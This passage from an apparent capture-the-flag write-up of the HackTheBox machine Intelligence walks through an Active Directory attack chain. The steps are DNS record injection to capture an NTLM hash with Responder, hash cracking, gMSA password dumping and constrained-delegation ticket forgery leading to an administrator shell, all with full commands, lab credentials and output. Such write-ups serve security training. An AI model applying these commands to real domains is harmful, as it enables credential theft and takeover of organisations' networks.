  ..                                 DR        0  Sun Apr 18 20:51:46 2021
  user.txt                           AR       34  Sun Aug 15 03:31:01 2021

                3770367 blocks of size 4096. 1462999 blocks available

```

I’ll put it:

```

smb: \Tiffany.Molina\desktop\> get user.txt
getting file \Tiffany.Molina\desktop\user.txt of size 34 as user.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)

```

And get the first flag:

```

oxdf@parrot$ cat user.txt
d3bf14a5************************

```

## SMB as Ted.Graves

### Enumeration

#### Bloodhound

With valid creds on the domain, I can now run [BloodHound](https://github.com/BloodHoundAD/BloodHound) to get a dump of the users/computers/permissions. I like the [Python collector](https://github.com/fox-it/BloodHound.py) for this case where I have creds but not a shell on the machine:

```

oxdf@parrot$ bloodhound-python -c ALL -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -d intelligence.htb -dc intelligence.htb -ns 10.10.10.248
INFO: Found AD domain: intelligence.htb
INFO: Connecting to LDAP server: intelligence.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: intelligence.htb
INFO: Found 42 users
INFO: Found 54 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: svc_int.intelligence.htb
INFO: Querying computer: dc.intelligence.htb
INFO: Skipping enumeration for svc_int.intelligence.htb since it could not be resolved.
INFO: Done in 00M 05S

```

On importing that into Bloodhound, Tiffany.Molina doesn’t have anything interesting:

![image-20210815092438342](https://0xdfimages.gitlab.io/img/image-20210815092438342.png)

I also had Bloodhound look for AS-REP roastable and Kerberoastable users, but there were none of interest.

I’ll revisit this later when I own more users.

#### SMB

There’s not much else I can access in the `Users` share. `NETLOGON` is empty and `SYSVOL` has typical DC stuff, but nothing useful. `IT` is a custom share name, and it contains a single file:

```

oxdf@parrot$ smbclient -U Tiffany.Molina //10.10.10.248/IT NewIntelligenceCorpUser9876
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Apr 18 20:50:55 2021
  ..                                  D        0  Sun Apr 18 20:50:55 2021
  downdetector.ps1                    A     1046  Sun Apr 18 20:50:55 2021

                3770367 blocks of size 4096. 1456236 blocks available
smb: \> get downdetector.ps1 
getting file \downdetector.ps1 of size 1046 as downdetector.ps1 (5.6 KiloBytes/sec) (average 5.6 KiloBytes/sec)

```

It’s a PowerShell script (I added whitespace):

```

# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
  try {
    $request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
    if(.StatusCode -ne 200) {
      Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
    }
  } catch {}
}

```

The script goes into LDAP and gets a list of all the computers, and then loops over the ones where the name starts with “web”. It will try to issue a web request to that server (with the running users’s credentials), and if the status code isn’t 200, it will email Ted.Graves and let them know that the host is down. The comment at the top says it is scheduled to run every five minutes.

### Capture Hash

`dnstool.py` is a script that comes with [Krbrelayx](https://github.com/dirkjanm/krbrelayx) that can:

> Add/modify/delete Active Directory Integrated DNS records via LDAP.

It’s worth a shot to see if Tiffany.Molina has permissions to make this kind of change by running with the following options:
- `-u intelligence\\Tiffany.Molina` - The user to authenticate as;
- `-p NewIntelligenceCorpUser9876` - The user’s password;
- `--action add` - Adding a new record;
- `--record web-0xdf` - The domain to add;
- `--data 10.01.14.19` - The data to add, in this case, the IP to resolve web-0xdf to;
- `--type A` - The type of record to add.

Running this seems to work:

```

oxdf@parrot$ python3 dnstool.py -u intelligence\\Tiffany.Molina -p NewIntelligenceCorpUser9876 --action add --record web-0xdf --data 10.10.14.19 --type A intelligence.htb
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully

```

I’ll start `nc` listening on port 80 to see any connections that come in. After a few minutes, there’s a connection:

```

oxdf@parrot$ nc -lnvp 80
listening on [any] 80 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.10.248] 64781
GET / HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.17763.1852
Host: web-0xdf
Connection: Keep-Alive

```

Given that I know it’s using credentials, I’ll switch to [Responder](https://github.com/SpiderLabs/Responder) to try to capture a Net-NTLMv2 hash. Responder runs with `sudo responder -I tun0`, and starts various servers, including HTTP.

If I try to set the DNS record again, it complains that it already exists, which I’ll take as a good sign:

```

oxdf@parrot$ python3 dnstool.py -u intelligence\\Tiffany.Molina -p NewIntelligenceCorpUser9876 --action add --record web-0xdf --data 10.10.14.19 --type A intelligence.htb
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[!] Record already exists and points to 10.10.14.19. Use --action modify to overwrite or --allow-multiple to override this

```

After five minutes, there’s a connection at Responder and a hash for Ted.Graves:

```

[HTTP] NTLMv2 Client   : 10.10.10.248
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:795ed731100fa3bf:EC36E05D2F850C3191B90CE10EFBD308:0101000000000000C9381448F792D7018BC129454A682E4000000000020008004B0054005000330001001E00570049004E002D0046005500450036004F00300059003800440049003200040014004B005400500033002E004C004F00430041004C0003003400570049004E002D0046005500450036004F003000590038004400490032002E004B005400500033002E004C004F00430041004C00050014004B005400500033002E004C004F00430041004C000800300030000000000000000000000000200000579BF3BE75B46EDA9826B9B1C8B2518795D25E61038C5C91F8A10A3DFB9AC4B70A0010000000000000000000000000000000000009003C0048005400540050002F007700650062002D0030007800640066002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000

```

### Crack Hash

`hashcat` makes quick work of the hash, returning a password almost immediately:

```

$ hashcat -m 5600 ted.graves.hash /usr/share/wordlists/rockyou.txt 
...[snip]...
TED.GRAVES::intelligence:795ed731100fa3bf:ec36e05d2f850c3191b90ce10efbd308:0101000000000000c9381448f792d7018bc129454a682e4000000000020008004b0054005000330001001e00570049004e002d0046005500450036004f00300059003800440049003200040014004b005400500033002e004c004f00430041004c0003003400570049004e002d0046005500450036004f003000590038004400490032002e004b005400500033002e004c004f00430041004c00050014004b005400500033002e004c004f00430041004c000800300030000000000000000000000000200000579bf3be75b46eda9826b9b1c8b2518795d25e61038c5c91f8a10a3dfb9ac4b70a0010000000000000000000000000000000000009003c0048005400540050002f007700650062002d0030007800640066002e0069006e00740065006c006c006900670065006e00630065002e006800740062000000000000000000:Mr.Teddy
...[snip]...

```

Ted.Graves has a password of “Mr.Teddy”. `crackmapexec` confirms it works for SMB:

```

oxdf@parrot$ crackmapexec smb 10.10.10.248 -u Ted.Graves -p Mr.Teddy -d intelligence.htb
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Ted.Graves:Mr.Teddy 

```

## Shell as Administrator

### Enumeration

Ted.Graves doesn’t have access to anything new over SMB, and at first glance, the previous Bloodhound collection as Tiffany.Molina doesn’t show anything particularly interesting with this account. There are no first degree object control or group delegated object control items. However, if I re-run with Ted.Graves credentials, there’s a slight difference:

![image-20210816144034456](https://0xdfimages.gitlab.io/img/image-20210816144034456.png)

Clicking on that 1 brings up the following:

![image-20210816144106307](https://0xdfimages.gitlab.io/img/image-20210816144106307.png)

Ted.Graves is in the ITSupport group, which has `ReadGMSAPassword` on SVC\_INT. Even more interestingly, if I use the pre-built query “Shortest Path from Owned Principles”, the svc\_int account has `AllowedToDelegate` on the DC:

![image-20210816144237665](https://0xdfimages.gitlab.io/img/image-20210816144237665.png)

### GMSA Password

[Group Manage Service Accounts](https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/service-accounts-group-managed) (GMSA) provide additional security to service accounts. There’s a Python tool for extracting GMSA passwords, [gMSADumper](https://github.com/micahvandeusen/gMSADumper), was written by the author of Intelligence, which is another good sign I’m headed in the right direction.

As Tiffany.Molina, it doesn’t find anything (which makes sense):

```

oxdf@parrot$ python3 gMSADumper.py -u tiffany.molina -p NewIntelligenceCorpUser9876 -l intelligence.htb -d intelligence.htb
Users or groups who can read password for svc_int$:
 > DC$
 > itsupport

```

But as Ted.Graves, it does:

```

oxdf@parrot$ python3 gMSADumper.py -u ted.graves -p Mr.Teddy -l intelligence.htb -d intelligence.htb
Users or groups who can read password for svc_int$:
 > DC$
 > itsupport
svc_int$:::5e47bac787e5e1970cf9acdb5b316239

```

Unfortunately for me, I wasn’t able to crack this hash. Still, because it’s an NTLM hash, I can pass it.

### Get Ticket

[This post from OnSecurity](https://www.onsecurity.io/blog/abusing-kerberos-from-linux/) gives the steps to request a forged ticket from the delegated service. I’ll use `getST.py` from [Impacket](https://github.com/SecureAuthCorp/impacket) to craft a ticket. I need to pass it the following options:
- `-dc-ip 10.10.10.248`
- `-spn www/dc.intelligence.htb` - the SPN (see below)
- `-hashes :5e47bac787e5e1970cf9acdb5b316239` - the NTLM I collected earlier
- `-impersonate administrator` - the user I want a ticket for
- `intelligence.htb/svc_int` - the account I’m running

To get the SPN, that’s in the Node Info -> Node Properties section for the svc\_int user in Bloodhound:

![image-20210816151104668](https://0xdfimages.gitlab.io/img/image-20210816151104668.png)

When I run this, it complains that the clock skew is off:

```

oxdf@parrot$ getST.py -dc-ip 10.10.10.248 -spn www/dc.intelligence.htb -hashes :5e47bac787e5e1970cf9acdb5b316239 -impersonate administrator intelligence.htb/svc_int
Impacket v0.9.24.dev1+20210814.5640.358fc7c6 - Copyright 2021 SecureAuth Corporation

[*] Getting TGT for user
Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)

```

`ntpdate` will update the time based on an NTP server, and based on the `nmap` scan at the start, Intelligence is running NTP. In VirtualBox, I also had to stop the guest utils service with `sudo service virtualbox-guest-utils status`, or else it changed the time back about 30 seconds after I changed it.

```

oxdf@parrot$ sudo service virtualbox-guest-utils stop
oxdf@parrot$ sudo ntpdate 10.10.10.248
16 Aug 22:18:50 ntpdate[920183]: step time server 10.10.10.248 offset +25397.724923 sec

```

Now it generates a ticket:

```

oxdf@parrot$ getST.py -dc-ip 10.10.10.248 -spn www/dc.intelligence.htb -hashes :5e47bac787e5e1970cf9acdb5b316239 -impersonate administrator intelligence.htb/svc_int
Impacket v0.9.24.dev1+20210814.5640.358fc7c6 - Copyright 2021 SecureAuth Corporation

[*] Getting TGT for user
[*] Impersonating administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in administrator.ccache

```

### Shell

To get a shell, I’ll use `wmiexec` (which comes with Impacket). `-k` will specify Kerberos authentication. I’ll set the `KRB5CCNAME` environment variable to point to the ticket file I want to use.

```

oxdf@parrot$ KRB5CCNAME=administrator.ccache wmiexec.py -k -no-pass administrator@dc.intelligence.htb
Impacket v0.9.24.dev1+20210814.5640.358fc7c6 - Copyright 2021 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
intelligence\administrator

```

And I can grab the flag:

```

C:\users\administrator\desktop>type root.txt
608f623a************************

```